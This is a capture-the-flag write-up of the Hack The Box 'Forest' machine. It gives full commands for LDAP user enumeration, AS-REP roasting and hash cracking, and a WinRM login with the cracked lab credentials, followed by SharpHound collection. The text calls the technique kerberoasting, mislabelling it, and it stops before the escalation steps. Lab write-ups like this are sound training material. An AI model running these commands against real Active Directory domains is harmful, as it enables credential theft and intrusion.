Forest Write-Up

Jul 15, 2021

Forest

This machine was part of the Easy month on Hack The Box. For this machine I researched and learned a lot about active directory and the various dangerous configurations that can exist. I gain initial foothold by kerberoasting a service account. I escalate to the Administrator account by leveraging delegation permissions setup within the Active Directory to hijack an account that can dump the Administrator hash as it has the DCSync permission.

Kerberoasting

I first looked into my options of attacking a DC without any valid user credentials. Turns out that there exists a flag (do not require kerberos preauthentication) that can be configured on a AD account that allows us to request a TGT ticket for that AD account without providing any credentials.

The TGT ticket is encrypted with the Hash of the AD account. So by obtaining that ticket we can attempt to brute force the password using a dictionary.

To find a user that has the flag set, we would need AD credentials to search the LDAP for any such users. Since we do not have any credentials, we must guess the username.

I run ldapsearch to extract a list of usernames:

sudo echo "10.10.10.161     htb.local" >> /etc/hosts
ldapsearch -x -h 10.10.10.161 -p389 -b "DC=htb,DC=local" | grep -i 'dn: CN=' | cut -d ',' -f 1 | cut -d '=' -f 2 > users.lst

Using the list of usernames I attempt to find any account with the do not require kerberos preauthentication account set. I discover that the svc-alfresco account is configured as such and crack its password hash using John the Ripper. I get the following credentials svc-alfresco:s3rvice.

impacket-GetNPUsers htb.local/ -usersfile users.lst -dc-ip 10.10.10.161 -request-format john -outputfile tgt-tickets.txt

john --wordlist=/usr/share/wordlists/rockyou.txt tgt-tickets.txt

Local Enumeration

I logon to the DC using winrm and the service account credentials. Next, I upload and run BloodHound as this box is all about Active Directory.

evil-winrm -i 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'
*Evil-WinRM* PS C:\Users\svc-alfresco\downloads> upload /home/kali/Downloads/sharphound.ps1
*Evil-WinRM* PS C:\Users\svc-alfresco\downloads> .\sharphound.ps1
*Evil-WinRM* PS C:\Users\svc-alfresco\downloads> Invoke-Bloodhound -CollectionMethod All -Domain htb.local -LDAPUsername svc-alfresco -LDAPPassword s3rvice
*Evil-WinRM* PS C:\Users\svc-alfresco\downloads> download 20210717094745_BloodHound.zip

Exploitig Active Directory Permissions

To analyze the results of the Bloodhound script, I need to start Neo4j and then import the results in the BloodHound GUI application. Once I have done that, I can query the shortest path to Domain Admin and perform the required steps.
